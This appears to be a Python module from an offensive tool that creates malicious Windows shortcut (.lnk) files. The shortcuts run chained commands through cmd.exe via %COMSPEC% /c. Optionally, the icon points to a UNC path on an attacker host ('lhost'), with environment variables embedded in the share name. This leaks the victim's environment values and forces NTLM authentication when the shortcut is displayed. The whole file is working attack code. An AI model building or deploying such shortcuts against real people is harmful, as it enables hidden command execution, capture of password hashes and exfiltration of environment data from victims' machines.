import os
from pathlib import PureWindowsPath
from typing import Iterable

import pylnk3

try:
    from ._version import __version__
except ImportError:
    __version__ = "0.0.0"


def create_lnk(
    outfile: str | os.PathLike[str],
    command: str,
    /,
    *commands: str,
    env_vars: Iterable[str] = (),
    lhost="127.0.0.1",
    ntlm=False,
):
    lnk = pylnk3.Lnk()
    lnk.link_info = None
    lnk.link_flags.HasExpString = True
    env_block = pylnk3.ExtraData_EnvironmentVariableDataBlock()
    env_block.target_ansi = env_block.target_unicode = "%COMSPEC%\0"
    lnk.extra_data = pylnk3.ExtraData(blocks=[env_block])
    if commands:
        command = '"%s"' % " && ".join([command, *commands]).replace('"', '""')
    lnk.arguments = f"/c {command}"
    orig = share_name = "Share"
    for v in env_vars:
        share_name += f"_%{v}%"
    if ntlm or share_name != orig:
        from random import randint

        filename = "%d.ico" % randint(0, 50000)
        lnk.icon = str(PureWindowsPath("//", lhost, share_name, filename))
    lnk.save(outfile)
